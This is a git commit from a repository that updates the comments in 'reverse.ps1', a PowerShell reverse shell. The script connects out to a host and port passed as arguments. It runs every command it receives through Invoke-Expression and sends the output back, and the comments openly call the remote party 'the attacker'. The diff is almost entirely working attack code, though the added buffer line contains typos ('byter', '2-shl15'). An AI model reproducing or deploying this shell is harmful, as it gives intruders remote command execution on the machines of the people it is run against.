3d793b85e81f4f4d6287ce6762cc2447bd2c4588
thefishua <65060280+thefishua@users.noreply.github.com>
2022-04-06 14:46:09 +1000

    Updated comments on reverse.ps1
    To make it more understandable

--- reverse.ps1
+++ reverse.ps1
@@ -5,20 +5,26 @@
 $c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
 # Create a client stream to read and write to the connection
 $I = $c.GetStream();
-
+# Creating a buffer for the incoming commands from the attacker
+[byter[]]$U = 0..(2-shl15) | %{0};
 # Writing output to client stream 
 $I.Write($U,0,$U.Length)
 # Get location of Path Directory and encode in ASCII
 $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
 $I.Write($U,0,$U.Length)
-
-while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
-# Create stdin and stderr for the reverse shell 
-$a = (iex $D 2>&1 | Out-String );
-# Add the Path of the system in the current dir to the reverse shell
-$r  = $a + (pwd).Path + '> ';
-$m = ([text.encoding]::ASCII).GetBytes($r);
-$I.Write($m,0,$m.Length);
-$I.Flush()};
+# While the attacker is still sending commands to the targeted computer keep the connection
+while(($k = $I.Read($U, 0, $U.Length)) -ne 0) {
+  ;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
+  # Evaluate the expression given being a command from the attacker and
+  # Create stdin and stderr for the reverse shell and produce as an output string
+  $a = (iex $D 2>&1 | Out-String );
+  # Add the command to the current directories path and 
+  # Add the Path of the system in the current dir to the reverse shell
+  $r  = $a + (pwd).Path + '> ';
+  $m = ([text.encoding]::ASCII).GetBytes($r);
+  # Write the command to the terminal
+  $I.Write($m,0,$m.Length);
+  $I.Flush()
+};
 # Close the connection after the Attackers connection has closed
 $c.Close()
